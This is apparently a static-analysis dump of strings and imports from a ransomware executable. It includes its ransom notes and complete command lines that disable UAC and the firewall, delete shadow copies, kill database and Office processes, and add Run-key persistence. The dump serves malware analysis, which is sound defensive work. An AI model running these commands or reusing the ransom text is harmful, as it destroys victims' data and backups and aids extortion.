reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x416c95	0x4e6198	string	0x4158b0	</title><meta content='IE=edge' charset='ISO-8859-1'><HTA:APPLICATION ICON='msiexec.exe' SINGLEINSTANCE='yes' SysMenu='no'><script language='javascript'>window.moveTo(100, 100);window.resizeTo((window.screen.width)-200,(window.screen.height)-200);</script></head><style>.sal{font-size:19px;}.colo{border-radius:25px;color: black;background-color:#eaeceb;padding: 20px;white-space: pre-line;LINE-HEIGHT:20px;}.sel{color:black;background-color:#c4cac6;padding:40px;word-wrap:break-word;margin-bottom:50px;margin-top:60px;border-radius: 25px;LINE-HEIGHT:20px;}.img-container {text-align: center;}</style><body style='background-color:white;'><div class='img-container'><img src='data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4QAiRXhpZgAATU0AKgAAAAgAAQESAAMAAAABAAEAAAAAAAD/4Qm+aHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pg0KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNC40LjAtRXhpdjIiPg0KCTxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+DQoJCTxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+DQoJCQk8ZGM6Y3JlYXRvcj4NCgkJCQk8cmRmOlNlcT4NCgkJCQkJPHJkZjpsaT5WZWN0b3JTdG9jay5jb20vMTE0NDE0NDc8L3JkZjpsaT4NCgkJCQk8L3JkZjpTZXE+DQoJCQk8L2RjOmNyZWF0b3I+DQoJCTwvcmRmOkRlc2NyaXB0aW9uPg0KCTwvcmRmOlJERj4NCjwveDp4bXBtZXRhPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
0x416cc7	0x4e6158	string	0x4158b0	</br></br>Your Personal ID :
0x416cf9	0x4e6088	string	0x4158b0	</br></br>Sent E-mail Should Be Contains Your Personal ID.If Don't Get a Response Or Any Other Problem
0x416d2b	0x4e5658	string	0x4158b0	<div class=sel><li style='font-size:16px;'><u><b>What Guarantee Do We Give You ?</b></u></li><br><br><br><ul><div class=sal>You Can (Must) Send Some Files For Decryption Test( Before Paying ). File Size Must Be Less Than 2MB And Files Should Not Contains Valuabe Data Like (Backups , Databases etc ... ) .</div></ul><br><hr><br><b><li style='font-size:16px;'><u>How To Buy Bitcoins</u></li></b><br><br><br><ul><div class=sal>Get Buy Bitcoin Instructions At LocalBitcoins : <br><br><a href='https://localbitcoins.com/guides/how-to-buy-bitcoins'>https://localbitcoins.com/guides/how-to-buy-bitcoins</a><br><br>Buy Bitcoin Instructions At Coindesk And Other Websites By Searching At Google :<br><br><a href='http://www.coindesk.com/information/how-can-i-buy-bitcoins/'>http://www.coindesk.com/information/how-can-i-buy-bitcoins/</a></div></ul><br><hr><br><u><li style='font-size:16px;'><b>Attention !!</b></li></u><ul><br><div class=sal><li>Do Not Edit Or Rename Encrypted Files.</li><br><br><li>Do Not Try To Decrypt Files By Third-Party Or Data Recovery Softwares It May Damage Files Forever.</li><br><br><li>In Case Of Trying To Decrypt Files With Third-Party,Recovery Sofwares This May Make The Decryption Harder So Prices Will Be Rise.</div><br></li></ul><br><br><hr><br></div></div></body></html>
0x416e17	0x47cd20	string	0x4158b0	WVS3
0x416e25	0x47cd20	string	0x4158b0	WVS3
0x416e55	0x47cd20	string	0x4158b0	WVS3
0x416e63	0x47cd20	string	0x4158b0	WVS3
0x416f24	0x4ea590	string	0x4158b0	echo %date%-%time%
0x416f9f	0x4ea5a4	string	0x4158b0	systeminfo|find /i "os name"
0x416fab	0x4ea5c4	string	0x4158b0	Microsoft
0x4170d5	0x4ea5d8	string	0x4158b0	systeminfo|find /i "original"
0x417240	0x4ea5fc	string	0x4158b0	_Fast_Mode
0x41725d	0x4ea608	string	0x4158b0	_Slow_Mode
0x41726d	0x4ea64c	string	0x4158b0	_And_Netword_Drive_Size:
0x4172a1	0x4ea638	string	0x4158b0	_Encryption_Mode:
0x4178cd	0x4ea678	string	0x4158b0	s4e5y
0x4178eb	0x4ea708	string	0x4158b0	o8g9n
0x417977	0x4e5640	string	0x4158b0	p2h6
0x4179c7	0x4e5638	string	0x4158b0	n7t0
0x4179de	0x4e5640	string	0x4158b0	p2h6
0x417afb	0x4e02c8	string	0x4158b0	:\Users\
0x417b2d	0x4ea714	string	0x4158b0	\AppData\f__d_d.sys
0x417ca0	0x4ea708	string	0x4158b0	o8g9n
0x417cd0	0x4e02c8	string	0x4158b0	:\Users\
0x417d06	0x4ea73c	string	0x4158b0	\AppData\Renc.sys
0x417e3b	0x4ea760	string	0x4158b0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f&vssadmin.exe Delete Shadows /All /Quiet&wmic shadowcopy delete&netsh advfirewall set currentprofile state off&netsh firewall set opmode mode=disable&netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
0x417e69	0x4ea8b0	string	0x4158b0	taskkill /im notepad.exe&taskkill /im msftesql.exe&taskkill /im sqlagent.exe&taskkill /im sqlbrowser.exe&taskkill /im sqlservr.exe&taskkill /im sqlwriter.exe&taskkill /im oracle.exe&taskkill /im ocssd.exe&taskkill /im dbsnmp.exe&taskkill /im synctime.exe&taskkill /im agntsvc.exe&taskkill /im mydesktopqos.exe&taskkill /im isqlplussvc.exe&taskkill /im xfssvccon.exe&taskkill /im mydesktopservice.exe&taskkill /im ocautoupds.exe&taskkill /im agntsvc.exe&taskkill /im encsvc.exe&taskkill /im firefoxconfig.exe&taskkill /im tbirdconfig.exe&taskkill /im ocomm.exe&taskkill /im mysqld.exe&taskkill /im mysqld-nt.exe&taskkill /im mysqld-opt.exe&taskkill /im dbeng50.exe&taskkill /im sqbcoreservice.exe&taskkill /im excel.exe&taskkill /im infopath.exe&taskkill /im msaccess.exe&taskkill /im mspub.exe&taskkill /im onenote.exe&taskkill /im outlook.exe&taskkill /im powerpnt.exe&taskkill /im steam.exe&taskkill /im thebat.exe&taskkill /im thebat64.exe&taskkill /im thunderbird.exe&taskkill /im visio.exe&taskkill /im winword.exe&taskkill /im wordpad.exe
0x417e88	0x4e02c8	string	0x4158b0	:\Users\
0x417eba	0x4eacc8	string	0x4158b0	\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Desktopini.exe
0x417f06	0x4cb05c	import	0x4158b0	KERNEL32.dll.CopyFileW
0x417f0f	0x4e53d0	string	0x4158b0	:\Documents and Settings\
0x417f41	0x4ead68	string	0x4158b0	\Start Menu\Programs\Startup\Desktopini.exe
0x417f95	0x4eb0e0	string	0x4158b0	All Your Files Encrypted With Strongest Encryption Algorithm !\r\n\r\n\r\n\r\nIf You Really Need Your Files Please Send Us E-mail To Get Decryption Tools and Instructions\r\n\r\nYou Must Send Some Locked Files To Us For Decryption Test(Before Paying) !\r\n\r\nIf You Do Not E-mail Us And Do Not Need Your Files After A whlie Our Servers Will Remove Your Decrypion Keys From Servers !!!\r\n\r\nYour Unique ID:
0x417fa8	0x4eb0b4	string	0x4158b0	\r\n\r\nEmail Address:
0x417fda	0x4eadc0	string	0x4158b0	\r\n\r\n\r\n\r\nAttention!!!\r\n\r\nSubject Your Unique ID\r\n\r\nDo Not Edit Or Rename Encrypted Files.\r\n\r\nIf You Do Not E-mail Us After 48 Hours Decryption Fee Will Double.\r\n\r\nDo Not Try To Decrypt Files By Third-Party Or Data Recovery Softwares It May Damage Files.\r\n\r\nIn Case Of Trying To Decrypt Files With Third-Party Sofwares,This May Make The Decryption Harder So Prices Will Be Rise.
0x418214	0x47bc4b	string	0x4158b0	;\r$AP
0x4185e6	0x4cb018	import	0x4185a0	KERNEL32.dll.SetErrorMode
0x4186a0	0x4cb030	import	0x4185a0	KERNEL32.dll.MultiByteToWideChar
0x4186bd	0x4cb03c	import	0x4185a0	KERNEL32.dll.GetDiskFreeSpaceExW
0x4186c4	0x4cb078	import	0x4185a0	KERNEL32.dll.GetDriveTypeW
0x4187ed	0x4cb0ac	import	0x4185a0	KERNEL32.dll.FindFirstFileW
0x418823	0x4eb3fc	string	0x4185a0	\Read_Me!_.txt
0x4188d9	0x4eb3fc	string	0x4185a0	\Read_Me!_.txt
0x418b10	0x4cb0a4	import	0x4185a0	KERNEL32.dll.FindNextFileW
0x418b36	0x4e4a38	string	0x4185a0	\Documents and Settings\
0x418bd3	0x4e49c8	string	0x4185a0	\Local Settings\Application Data\Microsoft\Credentials
0x418c67	0x418cb7	string	0x4185a0	h8JN
0x418c77	0x418cb7	string	0x4185a0	h8JN
0x418cb7	0x4e4a38	string	0x4185a0	\Documents and Settings\
0x418d5e	0x4e4a70	string	0x4185a0	\Application Data\Microsoft\Credentials
0x418e23	0x4e4ac0	string	0x4185a0	\Users\All Users\Microsoft\Windows\Caches
0x418eb3	0x4e4b14	string	0x4185a0	\ProgramData
0x418f10	0x418f43	string	0x4185a0	h0KN
0x418f27	0x418f43	string	0x4185a0	h0KN
0x418f43	0x4e4b30	string	0x4185a0	\Recovery
0x418fa0	0x418fd3	string	0x4185a0	hDKN
0x418fb7	0x418fd3	string	0x4185a0	hDKN
0x418fd3	0x4e4b44	string	0x4185a0	\ProgramData\Microsoft
0x419030	0x419063	string	0x4185a0	htKN
0x419047	0x419063	string	0x4185a0	htKN
0x419063	0x4e4b74	string	0x4185a0	\Windows
0x4190c6	0x4190f5	string	0x4185a0	h8JN
0x4190d9	0x4190f5	string	0x4185a0	h8JN
0x4190f5	0x4e4a38	string	0x4185a0	\Documents and Settings\
0x41919f	0x4e4b88	string	0x4185a0	\Local Settings\Temporary Internet Files
0x419233	0x419263	string	0x4185a0	h8JN
0x419247	0x419263	string	0x4185a0	h8JN
0x419263	0x4e4a38	string	0x4185a0	\Documents and Settings\
0x41930d	0x4e4bdc	string	0x4185a0	\Start Menu
0x4193ca	0x4e4bf8	string	0x4185a0	\Documents and Settings\All Users\Start Menu
0x419427	0x419456	string	0x4185a0	hTLN
0x41943a	0x419456	string	0x4185a0	hTLN
0x419456	0x4e4c54	string	0x4185a0	\WINDOWS
0x4194b3	0x4194e3	string	0x4185a0	hhLN
0x4194c7	0x4194e3	string	0x4185a0	hhLN
0x4194e3	0x4e4c68	string	0x4185a0	\Boot
0x419540	0x419573	string	0x4185a0	htLN
0x419557	0x419573	string	0x4185a0	htLN
0x419573	0x4e4c74	string	0x4185a0	\$RECYCLE.BIN
0x419603	0x4e4c90	string	0x4185a0	\System Volume Information
0x41a21b	0x4cb008	import	0x4185a0	ADVAPI32.dll.GetNamedSecurityInfoW
0x41a280	0x4cb070	import	0x4185a0	KERNEL32.dll.lstrcmpW
0x41a2ae	0x4eb3fc	string	0x4185a0	\Read_Me!_.txt
0x41a509	0x4cb058	import	0x4185a0	KERNEL32.dll.GetModuleFileNameW
0x41a557	0x4eb424	string	0x4185a0	\RCRU_64.exe
0x41a5ec	0x4cb05c	import	0x4185a0	KERNEL32.dll.CopyFileW
0x41a5f7	0x4eb440	string	0x4185a0	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f&reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f
0x41a646	0x4eb568	string	0x4185a0	reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
0x41a65a	0x4eb4f8	string	0x4185a0	/f&reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
0x41ad1b	0x4cb024	import	0x4185a0	KERNEL32.dll.GetFileAttributesW
0x41ae12	0x4e12cc	string	0x4185a0	[ID=
0x41b33c	0x4cb020	import	0x4185a0	KERNEL32.dll.FindClose
0x41b397	0x47bc4b	string	0x4185a0	;\r$AP
0x41b44a	0x4cb018	import	0x41b400	KERNEL32.dll.SetErrorMode
0x41b500	0x4cb030	import	0x41b400	KERNEL32.dll.MultiByteToWideChar
0x41b51d	0x4cb03c	import	0x41b400	KERNEL32.dll.GetDiskFreeSpaceExW
0x41b524	0x4cb078	import	0x41b400	KERNEL32.dll.GetDriveTypeW
0x41b54e	0x4cb0ac	import	0x41b400	KERNEL32.dll.FindFirstFileW
0x41b775	0x4eb3fc	string	0x41b400	\Read_Me!_.txt
0x41b82b	0x4eb3fc	string	0x41b400	\Read_Me!_.txt
0x41bd8c	0x4e4a38	string	0x41b400	\Documents and Settings\
0x41be29	0x4e49c8	string	0x41b400	\Local Settings\Application Data\Microsoft\Credentials
0x41bebd	0x41bf0c	string	0x41b400	h8JN
0x41becc	0x41bf0c	string	0x41b400	h8JN
0x41bf0c	0x4e4a38	string	0x41b400	\Documents and Settings\
0x41bfb3	0x4e4a70	string	0x41b400	\Application Data\Microsoft\Credentials
0x41c073	0x4e4ac0	string	0x41b400	\Users\All Users\Microsoft\Windows\Caches
0x41c103	0x4e4b14	string	0x41b400	\ProgramData
0x41c160	0x41c193	string	0x41b400	h0KN
0x41c177	0x41c193	string	0x41b400	h0KN
0x41c193	0x4e4b30	string	0x41b400	\Recovery
0x41c1f0	0x41c223	string	0x41b400	hDKN
0x41c207	0x41c223	string	0x41b400	hDKN
0x41c223	0x4e4b44	string	0x41b400	\ProgramData\Microsoft
0x41c280	0x41c2b3	string	0x41b400	htKN
0x41c297	0x41c2b3	string	0x41b400	htKN
0x41c2b3	0x4e4b74	string	0x41b400	\Windows
0x41c316	0x41c345	string	0x41b400	h8JN
0x41c329	0x41c345	string	0x41b400	h8JN
0x41c345	0x4e4a38	string	0x41b400	\Documents and Settings\
0x41c3ef	0x4e4b88	string	0x41b400	\Local Settings\Temporary Internet Files
0x41c483	0x41c4b3	string	0x41b400	h8JN
0x41c497	0x41c4b3	string	0x41b400	h8JN
0x41c4b3	0x4e4a38	string	0x41b400	\Documents and Settings\
0x41c55d	0x4e4bdc	string	0x41b400	\Start Menu
0x41c61a	0x4e4bf8	string	0x41b400	\Documents and Settings\All Users\Start Menu
0x41c677	0x41c6a6	string	0x41b400	hTLN
0x41c68a	0x41c6a6	string	0x41b400	hTLN
0x41c6a6	0x4e4c54	string	0x41b400	\WINDOWS
0x41c703	0x41c733	string	0x41b400	hhLN
0x41c717	0x41c733	string	0x41b400	hhLN
0x41c733	0x4e4c68	string	0x41b400	\Boot
0x41c790	0x41c7c3	string	0x41b400	htLN
0x41c7a7	0x41c7c3	string	0x41b400	htLN
0x41c7c3	0x4e4c74	string	0x41b400	\$RECYCLE.BIN
0x41c853	0x4e4c90	string	0x41b400	\System Volume Information
0x41d43c	0x4cb0a4	import	0x41b400	KERNEL32.dll.FindNextFileW
0x41d44b	0x4cb020	import	0x41b400	KERNEL32.dll.FindClose
0x41d51e	0x47bc4b	string	0x41b400	;\r$AP
0x41d559	0x4cb008	import	0x41b400	ADVAPI32.dll.GetNamedSecurityInfoW
0x41d575	0x4cb070	import	0x41b400	KERNEL32.dll.lstrcmpW
0x41d5b5	0x4eb3fc	string	0x41b400	\Read_Me!_.txt
0x41d80e	0x4cb058	import	0x41b400	KERNEL32.dll.GetModuleFileNameW
0x41d862	0x4eb424	string	0x41b400	\RCRU_64.exe
0x41d8f7	0x4cb05c	import	0x41b400	KERNEL32.dll.CopyFileW
0x41d902	0x4eb440	string	0x41b400	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f&reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f
0x41d951	0x4eb568	string	0x41b400	reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
0x41d965	0x4eb4f8	string	0x41b400	/f&reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
0x41e3b3	0x47bc4b	string	0x41e160	;\r$AP
0x41e46c	0x47bc4b	string	0x41e3d0	;\r$AP
0x41f138	0x41f149	string	0x41f0f0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41f13e	0x41f149	string	0x41f0f0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41f1fc	0x4e00c0	string	0x41f1f0	SHA-1
0x41f642	0x4eb5ec	string	0x41f610	OutputStringPointer
0x41fc8a	0x4cb0a0	import	0x41fbf0	KERNEL32.dll.ReleaseSemaphore
0x41fc98	0x47bc4b	string	0x41fbf0	;\r$AP
0x41fca1	0x4cb0a0	import	0x41fbf0	KERNEL32.dll.ReleaseSemaphore
0x41fcba	0x4cb0a0	import	0x41fbf0	KERNEL32.dll.ReleaseSemaphore
0x41fce8	0x47bc4b	string	0x41fbf0	;\r$AP
0x41fd59	0x4cb0a0	import	0x41fd00	KERNEL32.dll.ReleaseSemaphore
0x41fd72	0x4cb0a0	import	0x41fd00	KERNEL32.dll.ReleaseSemaphore
0x41fda0	0x47bc4b	string	0x41fd00	;\r$AP
0x420738	0x42074a	string	0x420680	3ۋE\b blocks=Basic Latin,Arabic
0x420978	0x42097c	string	0x420940	+Ӎ\f8 blocks=Basic Latin,Cyrillic
0x421506	0x47bc4b	string	0x421430	;\r$AP
0x421632	0x47bc4b	string	0x421520	;\r$AP
0x421a2a	0x4a0e38	string	0x421810	j\fhp
0x421a84	0x47bc4b	string	0x421810	;\r$AP
0x421b3f	0x49d058	string	0x421ae0	j\fh0
0x421bda	0x47bc4b	string	0x421bb0	;\r$AP
0x421c18	0x47bc4b	string	0x421bb0	;\r$AP
0x421cb4	0x47bc4b	string	0x421bb0	;\r$AP
0x421cf9	0x47bc4b	string	0x421bb0	;\r$AP
0x422e44	0x47bc4b	string	0x422d70	;\r$AP
0x422f5c	0x47bc4b	string	0x422e50	;\r$AP
0x42321b	0x423224	string	0x423110	3\tL$\f
0x42351b	0x4a0e38	string	0x423330	j\fhp
0x423566	0x47bc4b	string	0x423330	;\r$AP
0x423618	0x4a0e38	string	0x4235c0	j\fhp
0x423695	0x47bc4b	string	0x423670	;\r$AP
0x4236d1	0x47bc4b	string	0x423670	;\r$AP
0x42372c	0x47bc4b	string	0x423670	;\r$AP
0x42378b	0x47bc4b	string	0x423670	;\r$AP
0x4237ce	0x47bc4b	string	0x423670	;\r$AP
0x424100	0x424113	string	0x423f20	j\bV豁 blocks=Basic Latin,CJK Unified Ideographs
0x424109	0x424113	string	0x423f20	j\bV豁 blocks=Basic Latin,CJK Unified Ideographs
0x4255da	0x4255eb	string	0x4255b0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x4255e0	0x4255eb	string	0x4255b0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x42591a	0x47bc4b	string	0x425620	;\r$AP
0x425c23	0x4eb640	string	0x425bf0	BufferedTransformation: this object doesn't allow input
0x425cf3	0x4eb640	string	0x425cc0	BufferedTransformation: this object doesn't allow input
0x42600c	0x47bc4b	string	0x425fb0	;\r$AP
0x426208	0x47bc4b	string	0x426020	;\r$AP
0x426408	0x47bc4b	string	0x426220	;\r$AP
0x426490	0x47bc4b	string	0x426420	;\r$AP
0x426510	0x47bc4b	string	0x4264a0	;\r$AP
0x42658d	0x47bc4b	string	0x426520	;\r$AP
0x42660d	0x47bc4b	string	0x4265a0	;\r$AP
0x426812	0x47bc4b	string	0x426620	;\r$AP
0x4270ef	0x47bc4b	string	0x427080	;\r$AP
0x427127	0x47bc4b	string	0x427080	;\r$AP
0x427139	0x47bc4b	string	0x427080	;\r$AP
0x42714a	0x47bc4b	string	0x427080	;\r$AP
0x4273f7	0x47bc4b	string	0x427390	;\r$AP
0x42742f	0x47bc4b	string	0x427390	;\r$AP
0x427441	0x47bc4b	string	0x427390	;\r$AP
0x427452	0x47bc4b	string	0x427390	;\r$AP
0x427546	0x47bc4b	string	0x427460	;\r$AP
0x42782e	0x4eb6ac	string	0x427800	OAEP-
0x42784d	0x4e00b8	string	0x427800	MGF1
0x4278d2	0x4e00c0	string	0x427800	SHA-1
0x427fbb	0x47bc4b	string	0x427be0	;\r$AP
0x428491	0x47bc4b	string	0x428060	;\r$AP
0x428570	0x4eb70c	string	0x428570	invalid string position
0x428d2a	0x47bc4b	string	0x428c70	;\r$AP
0x4294d1	0x47bc4b	string	0x429360	;\r$AP
0x42984a	0x4e01f4	string	0x4296d0	nqpso5938fh71jfu
0x429fe6	0x47bc4b	string	0x429e90	;\r$AP
0x42a02b	0x4e0094	string	0x429ff0	FeedbackSize
0x42a050	0x47bc4b	string	0x429ff0	;\r$AP
0x42a9eb	0x4cb01c	import	0x42a9b0	KERNEL32.dll.WaitForMultipleObjectsEx
0x42ab68	0x4cb0a0	import	0x42a9b0	KERNEL32.dll.ReleaseSemaphore
0x42ab81	0x4cb0a0	import	0x42a9b0	KERNEL32.dll.ReleaseSemaphore
0x42abc5	0x47bc4b	string	0x42a9b0	;\r$AP
0x42ad73	0x47bc4b	string	0x42ac10	;\r$AP
0x42b47b	0x42b470	string	0x42b3a0	f90t
0x42b498	0x47bc4b	string	0x42b3a0	;\r$AP
0x42b4b2	0x47bc4b	string	0x42b3a0	;\r$AP
0x42b4cd	0x47bc4b	string	0x42b3a0	;\r$AP
0x42b4e5	0x47bc4b	string	0x42b3a0	;\r$AP
0x42b938	0x47bc4b	string	0x42b7c0	;\r$AP
0x42ba93	0x47bc4b	string	0x42b950	;\r$AP
0x42bbe3	0x47bc4b	string	0x42baa0	;\r$AP
0x42bcfd	0x47bc4b	string	0x42bbf0	;\r$AP
0x42c55e	0x47bc4b	string	0x42c3d0	;\r$AP
0x42da77	0x4dfb84	string	0x42d980	false
0x42dab1	0x4dfb8c	string	0x42d980	true
0x42dcf0	0x4eb6b4	string	0x42dcf0	vector<T> too long
0x42dec3	0x4cb050	import	0x42de70	KERNEL32.dll.GetProcessHeap
0x42deca	0x4cb0a8	import	0x42de70	KERNEL32.dll.HeapFree
0x42def0	0x4eb740	string	0x42def0	string too long
0x42e053	0x42e088	string	0x42df80	;K\fs
0x42e202	0x47bc4b	string	0x42df80	;\r$AP
0x42e5a0	0x4dfb84	string	0x42e4e0	false
0x42e5ce	0x4dfb8c	string	0x42e4e0	true
0x42ef29	0x4dfb24	string	0x42eed0	bad allocation
0x42efa7	0x4eb7a8	string	0x42eed0	class boost::exception_ptr __cdecl boost::exception_detail::get_static_exception_object<struct boost::exception_detail::bad_alloc_>(void)
0x42efae	0x4eb750	string	0x42eed0	C:\Users\Unknown\Downloads\boost_1_72_0\boost\exception\detail\exception_ptr.hpp
0x42f1a5	0x47bc4b	string	0x42eed0	;\r$AP
0x42f209	0x4dfb14	string	0x42f1b0	bad exception
0x42f287	0x4eb838	string	0x42f1b0	class boost::exception_ptr __cdecl boost::exception_detail::get_static_exception_object<struct boost::exception_detail::bad_exception_>(void)
0x42f28e	0x4eb750	string	0x42f1b0	C:\Users\Unknown\Downloads\boost_1_72_0\boost\exception\detail\exception_ptr.hpp
0x42f485	0x47bc4b	string	0x42f1b0	;\r$AP
0x42f6b2	0x42f6d4	string	0x42f6a0	_^[]
0x430432	0x4cb050	import	0x430400	KERNEL32.dll.GetProcessHeap
0x430439	0x4cb048	import	0x430400	KERNEL32.dll.HeapAlloc
0x4304df	0x4cb06c	import	0x430400	KERNEL32.dll.CreateEventA
0x430c82	0x430c86	string	0x430c70	SVW3۾@ blocks=Basic Latin,Arabic
0x430f06	0x4cb45c	string	0x430ed0	BER decode error
0x430f9d	0x47bc4b	string	0x430ed0	;\r$AP
0x431344	0x4313aa	string	0x431250	_^][
0x43179a	0x47bc4b	string	0x431250	;\r$AP
0x431aaf	0x47bc4b	string	0x4317c0	;\r$AP
0x431cd9	0x431d8a	string	0x431cc0	_^]2
0x431d5d	0x431d8a	string	0x431cc0	_^]2
0x431fa6	0x47bc4b	string	0x431df0	;\r$AP
0x43219a	0x47bc4b	string	0x431fe0	;\r$AP
0x432303	0x47bc4b	string	0x4321b0	;\r$AP
0x4324ff	0x430fb0	string	0x4324c0	SVWj
0x4325fe	0x47bc4b	string	0x4324c0	;\r$AP
0x432b07	0x47bc4b	string	0x432840	;\r$AP
0x432c6e	0x4cb8b4	string	0x432c40	PK_Signer: key too short for this signature scheme
0x432cf9	0x47bc4b	string	0x432c40	;\r$AP
0x433890	0x47bc4b	string	0x433720	;\r$AP
0x433ad4	0x47bc4b	string	0x433960	;\r$AP
0x434440	0x47bc4b	string	0x434100	;\r$AP
0x4344c9	0x47bc4b	string	0x434460	;\r$AP
0x43488f	0x4cbdac	string	0x4347d0	is not a valid key length
0x4349f9	0x47bc4b	string	0x4347d0	;\r$AP
0x434b24	0x4cbd70	string	0x434aa0	: this object doesn't support multiple channels
0x434ba7	0x47bc4b	string	0x434aa0	;\r$AP
0x434f1b	0x434f25	string	0x434e90	2҈T$,; blocks=Basic Latin,Cyrillic
0x434f1f	0x434f25	string	0x434e90	2҈T$,; blocks=Basic Latin,Cyrillic
0x43514c	0x47bc4b	string	0x435100	;\r$AP
0x435203	0x47bc4b	string	0x435180	;\r$AP
0x435291	0x47bc4b	string	0x435240	;\r$AP
0x43531e	0x47bc4b	string	0x4352d0	;\r$AP
0x4353a5	0x47bc4b	string	0x435350	;\r$AP
0x435778	0x4cc0c0	string	0x435750	NullRNG: NullRNG should only be passed to functions that don't need to generate random bytes
0x435822	0x47bc4b	string	0x4357b0	;\r$AP
0x4359cf	0x4cbeec	string	0x435980	KeySize
0x435b9e	0x47bc4b	string	0x435af0	;\r$AP
0x435d07	0x47bc4b	string	0x435bb0	;\r$AP
0x435d25	0x4cbf9c	string	0x435bb0	: this object requires an IV
0x435e98	0x4cbd34	string	0x435e70	BufferedTransformation: this object can't be reinitialized
0x4361bc	0x47bc4b	string	0x436110	;\r$AP
0x43629c	0x47bc4b	string	0x436230	;\r$AP
0x4362b2	0x4cc010	string	0x436230	: this object doesn't support a special last block
0x43635c	0x47bc4b	string	0x436300	;\r$AP
0x436549	0x47bc4b	string	0x4364f0	;\r$AP
0x436804	0x47bc4b	string	0x4367a0	;\r$AP
0x436cce	0x4cc058	string	0x436bd0	: message length
0x436cf6	0x4cbca8	string	0x436bd0	exceeds the maximum of
0x436d9b	0x4cc06c	string	0x436bd0	: footer length
0x436dbd	0x4cbca8	string	0x436bd0	exceeds the maximum of
0x436e2b	0x47bc4b	string	0x436bd0	;\r$AP
0x436fec	0x47bc4b	string	0x436fa0	;\r$AP
0x437099	0x47bc4b	string	0x437040	;\r$AP
0x43728d	0x47bc4b	string	0x437240	;\r$AP
0x4373e1	0x437420	string	0x437370	_^][
0x437414	0x437420	string	0x437370	_^][
